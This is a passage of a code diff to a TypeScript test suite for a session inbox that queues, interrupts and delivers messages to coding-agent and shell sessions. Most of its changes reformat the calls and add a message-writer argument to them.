+    const result = h.inbox
+      .interruptTurn({ sessionId: SID, principal: agentPrincipal() })
+      .then((value) => {
+        settled = true
+        return value
+      })
     await vi.waitFor(() => expect(h.interruptedPending).toHaveBeenCalled())
     try {
       expect(settled).toBe(false)
@@ -1273,8 +1514,12 @@ describe('SessionInbox authorization and identity', () => {
   it('propagates the pending retraction failure before confirming an interrupt', async () => {
     const h = harness({ agentKind: 'codex', phase: 'working' })
     h.interruptedPending.mockRejectedValueOnce(new Error('pending retraction write failed'))
-    await expect(h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() }))
-      .rejects.toThrow('pending retraction write failed')
+    await expect(
+      h.inbox.interruptTurn({
+        sessionId: SID,
+        principal: agentPrincipal(),
+      }),
+    ).rejects.toThrow('pending retraction write failed')
   })
 
   it('logs a failed native pending retraction while forwarding Escape immediately', async () => {
@@ -1303,7 +1548,11 @@ describe('SessionInbox authorization and identity', () => {
     const principal = testClientPrincipal('browser-2')
     const client = { id: 'client-2' } as ClientConn
 
-    await h.inbox.sendText({ sessionId: SID, text: 'keep this queued' })
+    await h.inbox.sendText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'keep this queued',
+    })
     await h.inbox.handleControllerInput(
       principal,
       client,
@@ -1321,6 +1570,7 @@ describe('SessionInbox authorization and identity', () => {
 
     expect(
       await h.inbox.answerAskUserQuestion({
+        writer: messageTestWriter(),
         sessionId: SID,
         choices: [{ optionIndices: [2] }],
         principal: agentPrincipal(),
@@ -1336,6 +1586,7 @@ describe('SessionInbox authorization and identity', () => {
 
     expect(
       await h.inbox.answerAskUserQuestion({
+        writer: messageTestWriter(),
         sessionId: SID,
         interactionId: 'ixn_test',
         choices: [{ optionIndices: [2] }],
@@ -1366,6 +1617,7 @@ describe('SessionInbox authorization and identity', () => {
 
     expect(
       await h.inbox.answerAskUserQuestion({
+        writer: messageTestWriter(),
         sessionId: SID,
         choices: [{ optionIndices: [2] }],
         principal,
@@ -1383,6 +1635,7 @@ describe('SessionInbox authorization and identity', () => {
 
     expect(
       await h.inbox.answerAskUserQuestion({
+        writer: messageTestWriter(),
         sessionId: SID,
         skip: true,
         principal,
@@ -1399,6 +1652,7 @@ describe('SessionInbox authorization and identity', () => {
 
     expect(
       await h.inbox.answerAskUserQuestion({
+        writer: messageTestWriter(),
         sessionId: SID,
         interactionId: 'ixn_test',
         skip: true,
@@ -1456,6 +1710,7 @@ describe('SessionInbox authorization and identity', () => {
 
       expect(
         await h.inbox.interruptText({
+          writer: messageTestWriter(),
           sessionId: SID,
           text: 'do this now',
           principal: agentPrincipal(),
@@ -1471,22 +1726,23 @@ describe('SessionInbox authorization and identity', () => {
     }
   })
 
-  it.each(['claude-code', 'grok', 'codex'] as const)(
-    'interrupt routes a working %s stop through the driver contract, typing nothing',
-    async (agentKind) => {
-      const h = harness({ agentKind, phase: 'working', contractInterrupt: { ok: true } })
-      const principal = agentPrincipal()
+  it.each([
+    'claude-code',
+    'grok',
+    'codex',
+  ] as const)('interrupt routes a working %s stop through the driver contract, typing nothing', async (agentKind) => {
+    const h = harness({ agentKind, phase: 'working', contractInterrupt: { ok: true } })
+    const principal = agentPrincipal()
 
-      expect(await h.inbox.interruptTurn({ sessionId: SID, principal })).toEqual({
-        ok: true,
-        requested: 'protocol',
-      })
+    expect(await h.inbox.interruptTurn({ sessionId: SID, principal })).toEqual({
+      ok: true,
+      requested: 'protocol',
+    })
 
-      expect(h.contractInterrupts).toEqual([SID])
-      expect(h.sent).toEqual([])
-      expect(h.answered).toEqual([])
-    },
-  )
+    expect(h.contractInterrupts).toEqual([SID])
+    expect(h.sent).toEqual([])
+    expect(h.answered).toEqual([])
+  })
 
   it('refuses a working agent stop it has no runtime connection to deliver', async () => {
     // The port ABSENT — an agent session on a server that cannot reach the
@@ -1494,7 +1750,10 @@ describe('SessionInbox authorization and identity', () => {
     // names the stop that did not happen.
     const h = harness({ agentKind: 'codex', phase: 'working' })
 
-    const result = await h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() })
+    const result = await h.inbox.interruptTurn({
+      sessionId: SID,
+      principal: agentPrincipal(),
+    })
 
     expect(result.ok).toBe(false)
     expect(h.sent).toEqual([])
@@ -1508,7 +1767,10 @@ describe('SessionInbox authorization and identity', () => {
   it('hands a stop to the driver even when the server believes the agent is idle', async () => {
     const h = harness({ agentKind: 'codex', phase: 'idle', contractInterrupt: { ok: true } })
 
-    const result = await h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() })
+    const result = await h.inbox.interruptTurn({
+      sessionId: SID,
+      principal: agentPrincipal(),
+    })
 
     expect(result).toEqual({ ok: true, requested: 'protocol' })
     expect(h.contractInterrupts).toEqual([SID])
@@ -1522,7 +1784,12 @@ describe('SessionInbox authorization and identity', () => {
       contractInterrupt: { reason: 'not_running', detail: 'no driver handle' },
     })
 
-    expect(await h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() })).toEqual({
+    expect(
+      await h.inbox.interruptTurn({
+        sessionId: SID,
+        principal: agentPrincipal(),
+      }),
+    ).toEqual({
       ok: false,
       reason: 'not_running: no driver handle',
     })
@@ -1533,13 +1800,19 @@ describe('SessionInbox authorization and identity', () => {
   it('lets stop retract a queued prompt even when idle codex has no turn to abort', async () => {
     const h = harness({ agentKind: 'codex', phase: 'idle' })
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'cancel before delivery',
       sourceMessageId: 'message-not-yet-injected',
       principal: agentPrincipal(),
     })
 
-    expect(await h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() })).toEqual({
+    expect(
+      await h.inbox.interruptTurn({
+        sessionId: SID,
+        principal: agentPrincipal(),
+      }),
+    ).toEqual({
       ok: true,
       requested: 'retraction',
     })
@@ -1554,12 +1827,14 @@ describe('SessionInbox authorization and identity', () => {
   it('withdraws the named queued prompt, never an earlier one, without asking a daemon that never had it', async () => {
     const h = harness({ agentKind: 'codex', phase: 'working', contractInterrupt: { ok: true } })
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'keep first',
       sourceMessageId: 'message-keep',
       principal: agentPrincipal(),
     })
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'cancel second',
       sourceMessageId: 'message-cancel',
@@ -1605,7 +1880,12 @@ describe('SessionInbox authorization and identity', () => {
     })
     h.contractCancel.mockResolvedValueOnce({ reason: 'busy' } as never)
 
-    expect(await h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() })).toEqual({
+    expect(
+      await h.inbox.interruptTurn({
+        sessionId: SID,
+        principal: agentPrincipal(),
+      }),
+    ).toEqual({
       ok: true,
       requested: 'keystroke',
     })
@@ -1623,7 +1903,12 @@ describe('SessionInbox authorization and identity', () => {
   it('hands an idle-looking Esc-harness stop to the driver, typing nothing', async () => {
     const h = harness({ agentKind: 'claude-code', phase: 'idle', contractInterrupt: { ok: true } })
 
-    expect(await h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() })).toEqual({
+    expect(
+      await h.inbox.interruptTurn({
+        sessionId: SID,
+        principal: agentPrincipal(),
+      }),
+    ).toEqual({
       ok: true,
       requested: 'protocol',
     })
@@ -1638,7 +1923,12 @@ describe('SessionInbox authorization and identity', () => {
     vi.useFakeTimers()
     const h = harness({ agentKind: 'shell', phase: 'idle' })
 
-    await h.inbox.sendText({ sessionId: SID, text: 'do not send this', principal: agentPrincipal() })
+    await h.inbox.sendText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'do not send this',
+      principal: agentPrincipal(),
+    })
     await vi.advanceTimersByTimeAsync(7_000)
     expect(
       h.sent
@@ -1649,7 +1939,12 @@ describe('SessionInbox authorization and identity', () => {
     // Idle shell with nothing queued: the stop is the shell's own Ctrl-C (harmless
     // at an idle prompt — a fresh prompt line), which also deletes the submit
     // generation so no further CR follows.
-    expect(await h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() })).toEqual({
+    expect(
+      await h.inbox.interruptTurn({
+        sessionId: SID,
+        principal: agentPrincipal(),
+      }),
+    ).toEqual({
       ok: true,
       requested: 'keystroke',
     })
@@ -1671,10 +1966,20 @@ describe('SessionInbox authorization and identity', () => {
     // instead.
     const h = harness({ agentKind: 'shell', phase: 'idle', status: 'hibernated' })
 
-    await h.inbox.queueText({ sessionId: SID, text: 'cancel immediately', principal: agentPrincipal() })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'cancel immediately',
+      principal: agentPrincipal(),
+    })
     expect(h.rows).toHaveLength(1)
     h.setStatus('live')
-    expect(await h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() })).toEqual({
+    expect(
+      await h.inbox.interruptTurn({
+        sessionId: SID,
+        principal: agentPrincipal(),
+      }),
+    ).toEqual({
       ok: true,
       requested: 'keystroke',
     })
@@ -1689,47 +1994,52 @@ describe('SessionInbox authorization and identity', () => {
   // POD-4795: an agent's interrupt is the interrupt MODE of one durable row.
   // The server sends no stop of its own and reads no phase (POD-4666): the
   // daemon's queue puts the row first, cuts a running turn, and types it.
-  it.each(['idle', 'working'] as const)(
-    'interrupt-urgency text to a %s agent is one durable row in the interrupt mode',
-    async (phase) => {
-      vi.useFakeTimers()
-      try {
-        const h = harness({
-          agentKind: 'codex',
-          phase,
-          hasBoundDriver: true,
-          contractInterrupt: { ok: true },
-          contractReceipts: [],
-        })
+  it.each([
+    'idle',
+    'working',
+  ] as const)('interrupt-urgency text to a %s agent is one durable row in the interrupt mode', async (phase) => {
+    vi.useFakeTimers()
+    try {
+      const h = harness({
+        agentKind: 'codex',
+        phase,
+        hasBoundDriver: true,
+        contractInterrupt: { ok: true },
+        contractReceipts: [],
+      })
 
-        expect(
-          await h.inbox.interruptText({
-            sessionId: SID,
-            text: 'stop and read this',
-            principal: agentPrincipal(),
-            sourceMessageId: 'msg-urgent',
-          }),
-        ).toEqual({ ok: true, queued: true })
-        await vi.advanceTimersByTimeAsync(500)
+      expect(
+        await h.inbox.interruptText({
+          writer: messageTestWriter(),
+          sessionId: SID,
+          text: 'stop and read this',
+          principal: agentPrincipal(),
+          sourceMessageId: 'msg-urgent',
+        }),
+      ).toEqual({ ok: true, queued: true })
+      await vi.advanceTimersByTimeAsync(500)
 
-        expect(h.contractInterrupts).toEqual([])
-        expect(h.sent).toEqual([])
-        expect(h.rows).toEqual([
-          expect.objectContaining({ id: 'msg-urgent', delivery: 'interrupt' }),
-        ])
-        // Forwarded under the message id, in the interrupt mode.
-        expect(h.contractCalls).toEqual([
-          expect.objectContaining({ turnId: 'msg-urgent', delivery: 'interrupt' }),
-        ])
-      } finally {
-        vi.useRealTimers()
-      }
-    },
-  )
+      expect(h.contractInterrupts).toEqual([])
+      expect(h.sent).toEqual([])
+      expect(h.rows).toEqual([expect.objectContaining({ id: 'msg-urgent', delivery: 'interrupt' })])
+      // Forwarded under the message id, in the interrupt mode.
+      expect(h.contractCalls).toEqual([
+        expect.objectContaining({ turnId: 'msg-urgent', delivery: 'interrupt' }),
+      ])
+    } finally {
+      vi.useRealTimers()
+    }
+  })
 
   it('a repeated interrupt of the same message is one row', async () => {
     const h = harness({ agentKind: 'codex', phase: 'working' })
-    const send = { sessionId: SID, text: 'read this', principal: agentPrincipal(), sourceMessageId: 'msg-once' }
+    const send = {
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: 'read this',
+      principal: agentPrincipal(),
+      sourceMessageId: 'msg-once',
+    }
     expect(await h.inbox.interruptText(send)).toEqual({ ok: true, queued: true })
     expect(await h.inbox.interruptText(send)).toEqual({ ok: true, queued: true })
     expect(h.rows).toHaveLength(1)
@@ -1746,6 +2056,7 @@ describe('SessionInbox authorization and identity', () => {
       })
 
       await h.inbox.interruptText({
+        writer: messageTestWriter(),
         sessionId: SID,
         text: 'stop and read this',
         principal: agentPrincipal(),
@@ -1764,7 +2075,12 @@ describe('SessionInbox authorization and identity', () => {
   it('refuses to interrupt a session that is not running', async () => {
     const h = harness({ status: 'exited' })
 
-    expect(await h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() })).toEqual({
+    expect(
+      await h.inbox.interruptTurn({
+        sessionId: SID,
+        principal: agentPrincipal(),
+      }),
+    ).toEqual({
       ok: false,
       reason: 'session not running',
     })
@@ -1796,7 +2112,10 @@ describe('SessionInbox authorization and identity', () => {
       contractInterrupt: { ok: true },
     })
 
-    const result = await h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() })
+    const result = await h.inbox.interruptTurn({
+      sessionId: SID,
+      principal: agentPrincipal(),
+    })
 
     expect(result).toEqual({ ok: true, requested: 'protocol' })
     expect(h.contractInterrupts).toEqual([SID])
@@ -1813,7 +2132,10 @@ describe('SessionInbox authorization and identity', () => {
       contractInterrupt: { reason: 'not_running', detail: 'no machine' },
     })
 
-    const result = await h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() })
+    const result = await h.inbox.interruptTurn({
+      sessionId: SID,
+      principal: agentPrincipal(),
+    })
 
     // The driver's own vocabulary, carried verbatim: the chat composer prints
     // this string, and 'not_running: no machine' tells an operator more than a
@@ -1827,7 +2149,10 @@ describe('SessionInbox authorization and identity', () => {
     // the daemon. Confirming here is the same lie by a different route.
     const h = harness({ agentKind: 'opencode', phase: 'working' })
 
-    const result = await h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() })
+    const result = await h.inbox.interruptTurn({
+      sessionId: SID,
+      principal: agentPrincipal(),
+    })
 
     expect(result.ok).toBe(false)
     expect(result.reason).toContain('could not be delivered')
@@ -1849,7 +2174,10 @@ describe('SessionInbox authorization and identity', () => {
       contractInterrupt: { ok: true },
     })
 
-    const result = await h.inbox.interruptTurn({ sessionId: SID, principal: agentPrincipal() })
+    const result = await h.inbox.interruptTurn({
+      sessionId: SID,
+      principal: agentPrincipal(),
+    })
 
     expect(result).toEqual({ ok: true, requested: 'protocol' })
     // Still working: nothing here waited for a fence, and nothing here claimed one.
@@ -1862,6 +2190,7 @@ describe('SessionInbox authorization and identity', () => {
 
     expect(
       await h.inbox.answerAskUserQuestion({
+        writer: messageTestWriter(),
         sessionId: SID,
         interactionId: 'ixn_test',
         choices: [{ freeText: 'custom', otherIndex: 3 }],
@@ -1882,7 +2211,10 @@ describe('SessionInbox authorization and identity', () => {
   describe.each([
     ['free text whose Other row is off the digit range', { freeText: 'custom', otherIndex: 12 }],
     ['an option index no digit can reach', { optionIndices: [11] }],
-    ['a preview question claiming to be multi-select', { optionIndices: [1], previewLayout: true, multiSelect: true }],
+    [
+      'a preview question claiming to be multi-select',
+      { optionIndices: [1], previewLayout: true, multiSelect: true },
+    ],
     [
       'several options on a preview question, which selects exactly one',
       { optionIndices: [1, 2], previewLayout: true },
@@ -1893,6 +2225,7 @@ describe('SessionInbox authorization and identity', () => {
 
       expect(
         await h.inbox.answerAskUserQuestion({
+          writer: messageTestWriter(),
           sessionId: SID,
           choices: [choice],
           principal: agentPrincipal(),
@@ -1910,6 +2243,7 @@ describe('SessionInbox authorization and identity', () => {
 
     expect(
       await h.inbox.answerAskUserQuestion({
+        writer: messageTestWriter(),
         sessionId: SID,
         interactionId: 'ixn_test',
         choices: [{ optionIndices: [1] }, { optionIndices: [2] }],
@@ -1929,6 +2263,7 @@ describe('SessionInbox authorization and identity', () => {
 
     expect(
       await h.inbox.answerAskUserQuestion({
+        writer: messageTestWriter(),
         sessionId: SID,
         interactionId: 'ixn_test',
         choices: [{ optionIndices: [1, 3], multiSelect: true }],
@@ -1948,7 +2283,12 @@ describe('SessionInbox durable wake reconciliation', () => {
     const h = harness({ agentKind: 'shell', status: 'hibernated', resumable: false })
 
     expect(
-      await h.inbox.queueText({ sessionId: SID, text: 'shell wake msg', principal: agentPrincipal() }),
+      await h.inbox.queueText({
+        writer: messageTestWriter(),
+        sessionId: SID,
+        text: 'shell wake msg',
+        principal: agentPrincipal(),
+      }),
     ).toEqual({ ok: true, queued: true })
     expect(h.rows).toHaveLength(1)
   })
@@ -1979,6 +2319,7 @@ describe('SessionInbox durable wake reconciliation', () => {
   it.each(['exited', 'hibernated'])('reconstructs one wake for queued %s work', async (status) => {
     const h = harness({ status })
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'queued before crash',
       mutationId: asMutationId('reconcile-wake'),
@@ -2002,6 +2343,7 @@ describe('SessionInbox durable wake reconciliation', () => {
   ] as const)('does not reconstruct a wake for %s', async (_name, options) => {
     const h = harness()
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'durable row',
       mutationId: asMutationId('reconcile-ineligible'),
@@ -2018,10 +2360,10 @@ describe('SessionInbox durable wake reconciliation', () => {
   })
 })
 
-  // RETIRED WITH THE SERVER TYPING LOOP (POD-4427). Transcript confirmation,
-  // retry budgets and readiness waits are deleted with the loop they served;
-  // shell rows settle on send and agent rows settle on driver delivery events.
-  // Shell FIFO coverage lives in inbox-gateway-delivery.test.ts.
+// RETIRED WITH THE SERVER TYPING LOOP (POD-4427). Transcript confirmation,
+// retry budgets and readiness waits are deleted with the loop they served;
+// shell rows settle on send and agent rows settle on driver delivery events.
+// Shell FIFO coverage lives in inbox-gateway-delivery.test.ts.
 describe('shell rows held past the typing loop', () => {
   it('cancels a held shell row when the CLI transcript reports an interrupt', async () => {
     vi.useFakeTimers()
@@ -2056,11 +2398,11 @@ describe('shell rows held past the typing loop', () => {
   })
 })
 
-  // RETIRED WITH THE AGENT READINESS CLOCK (POD-4279). Confirmed-turn readiness,
-  // exact-needle witnessing and the blind-write at-most-once fence now live in the
-  // terminal driver (readiness gate + injection awaitProof) and the durable delivery
-  // queue (proof-based settlement, daemon custody), exercised by the terminal
-  // injection/delivery-queue tests and the 414-test conformance corpus.
+// RETIRED WITH THE AGENT READINESS CLOCK (POD-4279). Confirmed-turn readiness,
+// exact-needle witnessing and the blind-write at-most-once fence now live in the
+// terminal driver (readiness gate + injection awaitProof) and the durable delivery
+// queue (proof-based settlement, daemon custody), exercised by the terminal
+// injection/delivery-queue tests and the 414-test conformance corpus.
 
 // RETIRED WITH THE AGENT READINESS CLOCK (POD-4279). The bind-stamped
 // composer-readiness window now lives in the terminal driver (readiness gate at
@@ -2080,6 +2422,7 @@ describe('server-family drain via the runtime contract [POD-2291]', () => {
    *  the tests below name both with the one id. */
   const queueOne = async (h: ReturnType<typeof harness>, id: string, sourceMessageId?: string) =>
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'first prompt',
       mutationId: asMutationId(id),
@@ -2174,13 +2517,23 @@ describe('server-family drain via the runtime contract [POD-2291]', () => {
     const h = harness({ contractReceipts: [], hasBoundDriver: true, driverId })
     await queueOne(h, 'msg_failed', 'msg_failed')
     await vi.advanceTimersByTimeAsync(1_000)
-    await h.inbox.deliveryOutcome(SID, { rowId: 'msg_failed', outcome: 'failed', cause: 'not-recorded' })
+    await h.inbox.deliveryOutcome(SID, {
+      rowId: 'msg_failed',
+      outcome: 'failed',
+      cause: 'not-recorded',
+    })
     expect(h.rows).toEqual([])
-    const proof = { rowId: 'msg_failed', outcome: 'delivered' as const,
-      transcriptItem: { id: 'entry-1' }, harnessRef: [{ kind, id: 'msg_failed' }],
+    const proof = {
+      rowId: 'msg_failed',
+      outcome: 'delivered' as const,
+      transcriptItem: { id: 'entry-1' },
+      harnessRef: [{ kind, id: 'msg_failed' }],
     }
     // A protocol ack or a receipt's turn id does not name a history record.
-    await h.inbox.deliveryOutcome(SID, { ...proof, harnessRef: [{ kind: 'codex-turn', id: 'turn-1' }] })
+    await h.inbox.deliveryOutcome(SID, {
+      ...proof,
+      harnessRef: [{ kind: 'codex-turn', id: 'turn-1' }],
+    })
     await h.inbox.deliveryOutcome(SID, { ...proof, transcriptItem: undefined })
     await h.inbox.deliveryOutcome(SID, { ...proof, harnessRef: undefined })
     // Terminal hooks may attach an id even when the entry was matched by text.
@@ -2190,7 +2543,10 @@ describe('server-family drain via the runtime contract [POD-2291]', () => {
     h.session.driverId = driverId
     await h.inbox.deliveryOutcome(SID, proof)
     expect(h.idMatched).toHaveBeenCalledExactlyOnceWith({
-      messageId: proof.rowId, sessionId: SID, transcriptItem: proof.transcriptItem, harnessRef: proof.harnessRef,
+      messageId: proof.rowId,
+      sessionId: SID,
+      transcriptItem: proof.transcriptItem,
+      harnessRef: proof.harnessRef,
     })
     expect(h.applied).not.toHaveBeenCalled()
   })
@@ -2273,7 +2629,11 @@ describe('server-family drain via the runtime contract [POD-2291]', () => {
     expect(h.rows).toHaveLength(1)
     expect(h.applied).not.toHaveBeenCalled()
     expect(h.unconfirmed).not.toHaveBeenCalled()
-    expect(h.harnessIds).toHaveBeenCalledWith({ messageId: 'msg_held', sessionId: SID, harnessRef: [turn] })
+    expect(h.harnessIds).toHaveBeenCalledWith({
+      messageId: 'msg_held',
+      sessionId: SID,
+      harnessRef: [turn],
+    })
     await h.inbox.deliveryOutcome(SID, { rowId: 'msg_held', outcome: 'delivered' })
     expect(h.applied).toHaveBeenCalledOnce()
     expect(h.rows).toEqual([])
@@ -2288,7 +2648,11 @@ describe('server-family drain via the runtime contract [POD-2291]', () => {
     const h = harness({ contractReceipts: [] })
     await queueOne(h, 'msg_new_kind', 'msg_new_kind')
     await vi.advanceTimersByTimeAsync(1_000)
-    await h.inbox.deliveryOutcome(SID, { rowId: 'msg_new_kind', outcome: 'accepted', held: 'somewhere-new' })
+    await h.inbox.deliveryOutcome(SID, {
+      rowId: 'msg_new_kind',
+      outcome: 'accepted',
+      held: 'somewhere-new',
+    })
     expect(h.accepted).toHaveBeenCalledExactlyOnceWith({
       sourceMessageId: 'msg_new_kind',
       sessionId: SID,
@@ -2303,15 +2667,33 @@ describe('server-family drain via the runtime contract [POD-2291]', () => {
   ] as const)('forwards a row the program holds %s again as a recovery saying so (POD-4886)', async (held, expected) => {
     vi.useFakeTimers()
     const h = harness({
-      agentKind: 'codex', transcriptAvailable: true, hasBoundDriver: true, driverId: 'generic-pty',
-      contractReceipts: [], held: async () => held,
+      agentKind: 'codex',
+      transcriptAvailable: true,
+      hasBoundDriver: true,
+      driverId: 'generic-pty',
+      contractReceipts: [],
+      held: async () => held,
     })
-    h.rows.push({ delivery: 'when-ready', id: 'persisted', sessionId: SID, queuedAt: 1, text: 'held by the program', attempts: 1,
-      deliveryOwner: 'daemon', inputOrigin: 'human', principal: agentPrincipal(), sourceMessageId: 'persisted' })
+    h.rows.push({
+      delivery: 'when-ready',
+      id: 'persisted',
+      sessionId: SID,
+      queuedAt: 1,
+      text: 'held by the program',
+      attempts: 1,
+      deliveryOwner: 'daemon',
+      inputOrigin: 'human',
+      principal: agentPrincipal(),
+      sourceMessageId: 'persisted',
+    })
     await h.inbox.drain(SID, { justBound: true })
     await vi.advanceTimersByTimeAsync(0)
     expect(h.contractCalls).toHaveLength(1)
-    expect(h.contractCalls[0]).toMatchObject({ turnId: 'persisted', deliveryRecovery: true, ...expected })
+    expect(h.contractCalls[0]).toMatchObject({
+      turnId: 'persisted',
+      deliveryRecovery: true,
+      ...expected,
+    })
     if (held !== 'durable') expect(h.contractCalls[0]).not.toHaveProperty('held')
   })
 
@@ -2350,7 +2732,10 @@ describe('server-family drain via the runtime contract [POD-2291]', () => {
       at: new Date().toISOString(),
     }
 
-    expect(await queueOne(h, 'msg_srv_exit_bind', 'msg_srv_exit_bind')).toEqual({ ok: true, queued: true })
+    expect(await queueOne(h, 'msg_srv_exit_bind', 'msg_srv_exit_bind')).toEqual({
+      ok: true,
+      queued: true,
+    })
     await vi.advanceTimersByTimeAsync(1_000)
     expect(h.contractCalls).toHaveLength(1)
     expect(h.inbox.isDraining(SID)).toBe(false)
@@ -2416,7 +2801,9 @@ describe('server-family drain via the runtime contract [POD-2291]', () => {
   it('honors an archive that lands while authorization is pending', async () => {
     vi.useFakeTimers()
     let authorize!: (decision: { ok: true }) => void
-    const permission = new Promise<{ ok: true }>((resolve) => { authorize = resolve })
+    const permission = new Promise<{ ok: true }>((resolve) => {
+      authorize = resolve
+    })
     const h = harness({ contractReceipts: [], authorizeAtDrain: () => permission })
     await queueOne(h, 'held-during-admission')
     Object.assign(h.session, { archived: true })
@@ -2434,7 +2821,9 @@ describe('server-family drain via the runtime contract [POD-2291]', () => {
     h.listQueue.mockImplementation(async () => {
       if (h.rows.some((row) => row.deliveryOwner === 'daemon') && !reserved) {
         reserved = true
-        return new Promise<typeof h.rows>((resolve) => { release = resolve })
+        return new Promise<typeof h.rows>((resolve) => {
+          release = resolve
+        })
       }
       return [...h.rows]
     })
@@ -2455,7 +2844,12 @@ describe('server-family drain via the runtime contract [POD-2291]', () => {
     await queueOne(h, 'second')
     await vi.advanceTimersByTimeAsync(0)
     expect(h.contractCalls).toHaveLength(1)
-    h.contractResolvers[0]!({ outcome: 'queued', position: 1, deliveredAs: 'queue', at: new Date().toISOString() })
+    h.contractResolvers[0]!({
+      outcome: 'queued',
+      position: 1,
+      deliveredAs: 'queue',
+      at: new Date().toISOString(),
+    })
     await vi.advanceTimersByTimeAsync(0)
     expect(h.contractCalls).toHaveLength(2)
     expect(h.rows).toHaveLength(2)
@@ -2484,10 +2878,16 @@ describe('server-family drain via the runtime contract [POD-2291]', () => {
     await queueOne(h, 'source-failed', 'source-failed')
     await queueOne(h, 'source-dropped', 'source-dropped')
     await vi.advanceTimersByTimeAsync(0)
-    await h.inbox.deliveryOutcome(SID, { rowId: 'source-failed', outcome: 'failed', reason: 'confirmation exhausted' })
+    await h.inbox.deliveryOutcome(SID, {
+      rowId: 'source-failed',
+      outcome: 'failed',
+      reason: 'confirmation exhausted',
+    })
     await h.inbox.deliveryOutcome(SID, { rowId: 'source-dropped', outcome: 'dropped' })
     expect(h.rows).toEqual([])
-    expect(h.rejected).toEqual([expect.objectContaining({ queueId: 'source-failed', reason: 'confirmation exhausted' })])
+    expect(h.rejected).toEqual([
+      expect.objectContaining({ queueId: 'source-failed', reason: 'confirmation exhausted' }),
+    ])
     expect(h.applied).not.toHaveBeenCalled()
   })
 
@@ -2638,7 +3038,9 @@ describe('server-family drain via the runtime contract [POD-2291]', () => {
     vi.useFakeTimers()
     const h = harness({})
 
-    expect(await h.inbox.sendText({ sessionId: SID, text: 'never typed' })).toEqual({
+    expect(
+      await h.inbox.sendText({ writer: messageTestWriter(), sessionId: SID, text: 'never typed' }),
+    ).toEqual({
       ok: true,
       queued: true,
     })
@@ -2663,18 +3065,37 @@ describe('queued input that nothing would come back for [POD-1703]', () => {
     const h = harness({ status: 'starting' })
     const principal = agentPrincipal()
 
-    await h.inbox.queueText({ sessionId: SID, text: PROMPT, principal, sourceMessageId: 'msg_a' })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: PROMPT,
+      principal,
+      sourceMessageId: 'msg_a',
+    })
     expect(h.rows).toHaveLength(1)
 
     // The delivery sweep re-pushes the SAME ledger row. Pre-fix this minted a
     // fresh queue id every pass, so the agent was typed the identical text
     // three times over five minutes while the first copy still sat unread.
-    await h.inbox.queueText({ sessionId: SID, text: PROMPT, principal, sourceMessageId: 'msg_a' })
-    await h.inbox.queueText({ sessionId: SID, text: PROMPT, principal, sourceMessageId: 'msg_a' })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: PROMPT,
+      principal,
+      sourceMessageId: 'msg_a',
+    })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: PROMPT,
+      principal,
+      sourceMessageId: 'msg_a',
+    })
     expect(h.rows).toHaveLength(1)
 
     // A DIFFERENT message is not the same intent and still queues.
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: 'something else',
       principal,
@@ -2683,8 +3104,18 @@ describe('queued input that nothing would come back for [POD-1703]', () => {
     expect(h.rows).toHaveLength(2)
 
     // And a row with no ledger intent behind it is not deduped by text.
-    await h.inbox.queueText({ sessionId: SID, text: PROMPT, principal })
-    await h.inbox.queueText({ sessionId: SID, text: PROMPT, principal })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: PROMPT,
+      principal,
+    })
+    await h.inbox.queueText({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      text: PROMPT,
+      principal,
+    })
     expect(h.rows).toHaveLength(4)
   })
 
@@ -2694,6 +3125,7 @@ describe('queued input that nothing would come back for [POD-1703]', () => {
     const h = harness({ phase: 'needs_user', transcriptAvailable: true, agentKind: 'shell' })
 
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: PROMPT,
       mutationId: asMutationId('queued-menu'),
@@ -2725,6 +3157,7 @@ describe('queued input that nothing would come back for [POD-1703]', () => {
     const h = harness({ status: 'hibernated', transcriptAvailable: true, agentKind: 'shell' })
 
     await h.inbox.queueText({
+      writer: messageTestWriter(),
       sessionId: SID,
       text: PROMPT,
       mutationId: asMutationId('queued-orphan'),
@@ -2782,7 +3215,11 @@ describe('configureSession', () => {
       contractConfigure: { ok: true, effective: 'next-turn' },
     })
 
-    const result = await h.inbox.configureSession({ sessionId: SID, model: 'gpt-5.1-codex-max' })
+    const result = await h.inbox.configureSession({
+      writer: messageTestWriter(),
+      sessionId: SID,
+      model: 'gpt-5.1-codex-max',
+    })
 
     expect(result).toEqual({ ok: true, effective: 'next-turn' })
     expect(h.contractConfigures).toEqual([{ sessionId: SID, model: 'gpt-5.1-codex-max' }])
@@ -2801,7 +3238,11 @@ describe('configureSession', () => {
       contractConfigure: { reason: 'invalid_value', detail: 'that is not a codex effort' },
     })
 
-    const result = await h.inbox.configureSession({ sessionId: SID, effort: 'ludicrous' })
+    const result = await h.inbox.configureSession({
